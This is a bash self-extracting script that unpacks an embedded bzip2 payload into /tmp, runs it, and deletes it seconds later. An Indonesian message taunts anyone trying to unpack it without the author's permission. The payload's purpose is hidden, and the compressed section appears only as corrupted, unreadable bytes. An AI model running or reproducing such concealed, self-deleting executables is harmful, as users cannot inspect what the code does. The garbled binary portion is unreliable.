#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY>3:� ��E�@ ���?�������@�D@0  `���5o]s��t4 (e�=�zM &�`&A�M4= �� T�Rh��      @ ���h44424 ��� L@h%=RT�j���Lh��4Ɛ�&	�Db`�24bbh(H�#)�I���=HP bd�  2�(�&�1JmG�jz��<��=C�2yM��4�f��
 x�!�o��������s���5X��)+B��s�	��B�<��q√�
�����i@D9�XE��Pr@����0��L	':�� ̪�
�ʉJ30��4�1�+�SM���T�,�R��+�����ɵ�`�^"�ܲ�7���Y�e�VT��k��Y���*!�B�R܋f%E��+u�v�Q�Ds[-��O�QUUUUUUUDUUUUUj�zU���e�M۳��/O�jz&c�R���Ht*�Z���tE�
(��(������P)2R*��QK�HRِyL�~�-`d��;��n�Uoߢ*��Q߃���Y�NX&�Eux� 2(�P��1BWJ��;?�^��)ˀ �����(�����߶����'��Ē?z ����z�Q�+J(��*v���LJ`�c�ms�kE��5Z�+���c�Pk�.Ǹ�u¸=�k��5���������b)"�QEQEQF��"]�µ+�hR3�!!!!/E{µ7�\��Jo�✡C~���O'>��(����@ ���Z�w-�E�����Eqn��8)��}�:��|�$CE����������^���+��z5��P�qA]��Xe���+h���]6���|��/���Z
����n��ٌ��I�ϴ+�0;�l7$	9�E���{뱲�O�R�)g��3p�h�����?�7�8�~�I!>6��Co^GEXԒQ��%��֠���hBI$V�ǀW7���B���3��A�湞�M�^��߆���E�,S�f���ro4���LS�4.Bp�T�d+[J���w�.�j<�z�k�zO���B �� �w�����N�DDUUU���7����E�^��ԇtW�W��Ǎ�$	9�D_҈ae@���
�+Z�ӫǟCay� ��mNp�=Q]3����+�<�TC>���Y�̾鑸5��>˨M�B@u�����N�|��E-�#��1�c�1�c���c�:U}�,+��|�c�;�Ȣ�4�aHHHQE6����i.�$$fC˜x��ɂ�ⷥu1:��x{���Qp���U�s�x주!L�FY��I�$�NI$�u�H�;�x�B�m��P���RR��Y�z�����i�3��ٱ���.�w�ah�kF�}'Q&ƷQ�d��@�D2��r��q&�p�� ˣ����7�:C����Ͱ!		a\MJ��b׆w:CQ��o�M#W]#�w�U�����1�o�I$��u]K��� 騭�Y�Pw��1�	O8��+TV�C!�)����+���I$���I�4!���ےW�5��ې~J,���e�J`B�50<�x�"	���!P�ky�'�.�p� |fu|